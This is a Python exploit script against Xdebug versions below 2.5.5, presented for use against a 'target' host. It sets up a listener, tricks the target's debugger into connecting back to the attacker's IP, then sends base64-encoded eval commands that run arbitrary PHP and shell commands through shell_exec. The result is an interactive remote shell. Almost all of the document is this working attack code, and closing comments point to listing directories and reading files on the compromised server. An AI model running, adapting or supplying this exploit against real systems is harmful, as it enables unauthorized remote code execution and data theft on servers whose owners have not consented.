# Title: Python exploiter xdebug < 2.5.5 weakness, remote shell
# author: Antonin PARROT 
# https://github.com/antoninparrot

import socket
import requests
import time
from base64 import b64decode, b64encode

#Change this: RHOST = the target, LHOST = your IP
RHOST = "http://www.target.com/xdebug_path.php"
LHOST = "YOUR_IP"


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('0.0.0.0',9000)) 
sock.listen(1)
time.sleep(0.2)
url = RHOST + "?XDEBUG_SESSION_START=exploit"

header ={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0", "X-Forwarded-For": LHOST}
cook = {"XDEBUG_SESSION_START":"exploit"}
try: #Server will not return anything, so the timeout will raise an error
	r = requests.get(url, headers=header,timeout=0.1)
except:
	None

def base64_decode(string):
	return b64decode(string.encode()).decode()


def trouve(mot,phrase):
	#Return the list of indices of mot found in the phrase
	indices = []
	i = 0
	while(i < len(phrase)):
		if mot in phrase[i:]:
			indices.append(phrase[i:].index(mot) + i)
			i = indices[-1] + 1
		else:
			break
	return indices

def decrypt(renvoie):
	 #Return the result, and an error if there is a mistake, it might need some ajustements depending on the target
	indices1 =trouve("CDATA[",renvoie)
	indices2 =trouve("]]",renvoie)
	if len(indices1)==0 or len(indices2)==0:
		return "\n     [-] Error in the request"
	if renvoie.find("error evaluating code")!=-1:
		return "\n     [-] Error in the request"
	for k in range(len(indices1)):
		val1 = indices1[k]+6
		val2 = indices2[k]
		print(base64_decode(renvoie[val1:val2]))
	return None

def commandes_unix():
	#To get out type stop
	flag = True
	while flag: #connection
		conn, caddr = sock.accept()
		junk = conn.recv(200000) 
		print("\n     [+] Connexion successful\n")
		while flag:
			try:
				cmd = str(input(" \ncmd# "))
				if cmd == "stop": #To get out
					flag = False
			except:
				break

			cmd += ' 2>&1' 

			cmd = "shell_exec('"+cmd+"')"
			if flag:
				commande_php = b64encode(bytes(cmd, 'utf-8'))			
				conn.sendall('eval -i 1 -- '.encode() + commande_php + '\x00'.encode())
				response = conn.recv(10270).decode()
				print(decrypt(response))

	print("     [+] Déconnexion successful \n")

def commandes_php():
	#To get out type stop
	flag = True
	while flag: #connection
		conn, caddr = sock.accept()
		junk = conn.recv(200000) 
		print("\n     [+] Connection réussie \n")
		while flag:
			try:
				cmd = str(input(" \nphp# "))
				if cmd == "stop": #To get out
					flag = False
			except:
				break

			if flag:
				commande_php = b64encode(bytes(cmd, 'utf-8'))			
				conn.sendall('eval -i 1 -- '.encode() + commande_php + '\x00'.encode())
				response = conn.recv(10270).decode()
				decrypt(response)


	print("     [+] Déconnexion successful \n")



commandes_php()
sock.close()

#scandir('.')
#file_get_contents('c491a08d66309dc3e4dd1e040c178022.txt')